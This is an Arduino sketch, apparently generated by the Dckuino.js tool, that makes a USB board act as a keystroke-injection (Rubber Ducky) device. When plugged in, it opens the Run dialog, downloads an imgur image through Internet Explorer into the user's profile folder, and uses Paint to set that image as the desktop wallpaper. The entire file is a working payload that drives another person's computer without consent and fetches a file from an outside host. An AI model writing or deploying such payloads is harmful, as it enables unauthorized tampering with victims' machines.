/*
 * Generated with <3 by Dckuino.js, an open source project !
 * http://seytonic.com/ducky/
 * https://thehacktoday.com/60-best-rubber-ducky-usb-payloads/
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("iexplore https://i.imgur.com/GVJ06OK.jpg");

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('f');
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("a");

  delay(100);

  Keyboard.print("%USERPROFILE%\GVJ06OK.jpg");

  delay(300);

  typeKey(KEY_RETURN);

  delay(300);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('w');
  Keyboard.releaseAll();

  delay(100);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("paint");

  delay(100);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('o');
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("%USERPROFILE%\\GVJ06OK.jpg");

  typeKey(KEY_RETURN);

  delay(300);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('f');
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("k");

  delay(100);

  Keyboard.print("f");

  delay(300);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('f');
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("x");

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
